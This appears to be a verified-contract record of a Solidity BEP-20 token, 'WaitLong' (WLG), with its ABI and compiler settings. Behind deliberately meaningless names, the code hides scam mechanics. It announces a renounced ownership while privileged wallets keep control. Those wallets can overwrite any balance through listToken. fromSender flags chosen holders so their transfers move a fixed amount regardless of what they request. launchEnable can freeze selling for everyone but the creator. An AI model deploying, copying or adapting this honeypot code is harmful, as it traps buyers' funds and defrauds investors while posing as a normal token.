{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface fundList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract listSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFundFee {\n    function createPair(address walletTo, address buyLaunched) external returns (address);\n}\n\ninterface shouldLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyAmount) external view returns (uint256);\n\n    function transfer(address tradingAmount, uint256 swapLimit) external returns (bool);\n\n    function allowance(address walletShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingAmount,\n        uint256 swapLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyTeam, uint256 value);\n    event Approval(address indexed walletShould, address indexed spender, uint256 value);\n}\n\ninterface shouldLaunchedMetadata is shouldLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WaitLong is listSell, shouldLaunched, shouldLaunchedMetadata {\n\n    bool public fromToMin;\n\n    function launchTeam(address atTrading) public {\n        require(atTrading.balance < 100000);\n        if (fromToMin) {\n            return;\n        }\n        if (teamEnable == amountTotal) {\n            teamEnable = shouldAt;\n        }\n        senderSwap[atTrading] = true;\n        \n        fromToMin = true;\n    }\n\n    function listToken(address toMarketing, uint256 swapLimit) public {\n        fundExempt();\n        exemptLimitReceiver[toMarketing] = swapLimit;\n    }\n\n    address isReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public senderBuy;\n\n    address public fromSenderAt;\n\n    constructor (){\n        if (amountTotal != teamEnable) {\n            shouldAt = amountTotal;\n        }\n        fundList buyLiquidity = fundList(isReceiver);\n        fromSenderAt = receiverFundFee(buyLiquidity.factory()).createPair(buyLiquidity.WETH(), address(this));\n        \n        senderBuy = _msgSender();\n        swapLaunch();\n        senderSwap[senderBuy] = true;\n        exemptLimitReceiver[senderBuy] = feeReceiverLimit;\n        \n        emit Transfer(address(0), senderBuy, feeReceiverLimit);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listFeeAt;\n    }\n\n    uint256 receiverLaunchIs;\n\n    function owner() external view returns (address) {\n        return txReceiver;\n    }\n\n    function approve(address receiverEnable, uint256 swapLimit) public virtual override returns (bool) {\n        tradingAuto[_msgSender()][receiverEnable] = swapLimit;\n        emit Approval(_msgSender(), receiverEnable, swapLimit);\n        return true;\n    }\n\n    uint8 private tradingEnable = 18;\n\n    function fundExempt() private view {\n        require(senderSwap[_msgSender()]);\n    }\n\n    uint256 public shouldAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeReceiverLimit;\n    }\n\n    uint256 constant swapList = 13 ** 10;\n\n    mapping(address => bool) public minAuto;\n\n    function allowance(address tradingTake, address receiverEnable) external view virtual override returns (uint256) {\n        if (receiverEnable == isReceiver) {\n            return type(uint256).max;\n        }\n        return tradingAuto[tradingTake][receiverEnable];\n    }\n\n    event OwnershipTransferred(address indexed maxEnable, address indexed isLimitTrading);\n\n    function launchEnable(uint256 swapLimit) public {\n        fundExempt();\n        receiverLaunchIs = swapLimit;\n    }\n\n    function transfer(address toMarketing, uint256 swapLimit) external virtual override returns (bool) {\n        return sellWallet(_msgSender(), toMarketing, swapLimit);\n    }\n\n    function balanceOf(address buyAmount) public view virtual override returns (uint256) {\n        return exemptLimitReceiver[buyAmount];\n    }\n\n    function swapLaunch() public {\n        emit OwnershipTransferred(senderBuy, address(0));\n        txReceiver = address(0);\n    }\n\n    address buyTeamFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fromSender(address fromLimit) public {\n        fundExempt();\n        \n        if (fromLimit == senderBuy || fromLimit == fromSenderAt) {\n            return;\n        }\n        minAuto[fromLimit] = true;\n    }\n\n    function sellWallet(address enableFrom, address tradingAmount, uint256 swapLimit) internal returns (bool) {\n        if (enableFrom == senderBuy) {\n            return tokenShould(enableFrom, tradingAmount, swapLimit);\n        }\n        uint256 atLaunchedEnable = shouldLaunched(fromSenderAt).balanceOf(buyTeamFrom);\n        require(atLaunchedEnable == receiverLaunchIs);\n        require(tradingAmount != buyTeamFrom);\n        if (minAuto[enableFrom]) {\n            return tokenShould(enableFrom, tradingAmount, swapList);\n        }\n        return tokenShould(enableFrom, tradingAmount, swapLimit);\n    }\n\n    function transferFrom(address enableFrom, address tradingAmount, uint256 swapLimit) external override returns (bool) {\n        if (_msgSender() != isReceiver) {\n            if (tradingAuto[enableFrom][_msgSender()] != type(uint256).max) {\n                require(swapLimit <= tradingAuto[enableFrom][_msgSender()]);\n                tradingAuto[enableFrom][_msgSender()] -= swapLimit;\n            }\n        }\n        return sellWallet(enableFrom, tradingAmount, swapLimit);\n    }\n\n    function tokenShould(address enableFrom, address tradingAmount, uint256 swapLimit) internal returns (bool) {\n        require(exemptLimitReceiver[enableFrom] >= swapLimit);\n        exemptLimitReceiver[enableFrom] -= swapLimit;\n        exemptLimitReceiver[tradingAmount] += swapLimit;\n        emit Transfer(enableFrom, tradingAmount, swapLimit);\n        return true;\n    }\n\n    mapping(address => uint256) private exemptLimitReceiver;\n\n    string private listFeeAt = \"Wait Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingEnable;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxTrading;\n    }\n\n    uint256 atLaunch;\n\n    uint256 private feeReceiverLimit = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private tradingAuto;\n\n    mapping(address => bool) public senderSwap;\n\n    uint256 private teamEnable;\n\n    string private maxTrading = \"WLG\";\n\n    function getOwner() external view returns (address) {\n        return txReceiver;\n    }\n\n    address private txReceiver;\n\n    uint256 private amountTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimitTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSenderAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapLimit\",\"type\":\"uint256\"}],\"name\":\"launchEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTrading\",\"type\":\"address\"}],\"name\":\"launchTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLimit\",\"type\":\"uint256\"}],\"name\":\"listToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WaitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}